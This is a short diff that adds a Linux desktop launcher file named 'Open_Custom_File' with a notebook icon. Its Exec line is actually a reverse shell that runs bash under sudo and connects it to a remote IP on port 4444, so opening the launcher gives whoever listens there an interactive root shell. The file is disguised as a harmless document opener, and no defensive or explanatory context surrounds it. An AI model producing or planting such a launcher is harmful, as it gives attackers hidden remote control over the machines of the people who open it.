@@ -1,0 +1,7 @@
+[Desktop Entry]
+Encoding=UTF-8
+Name=Open_Custom_File
+Exec=sudo /bin/bash -i > /dev/tcp/192.168.145.146/4444 0<&1 2>&1
+Terminal=true
+Type=Application
+Icon=notebook
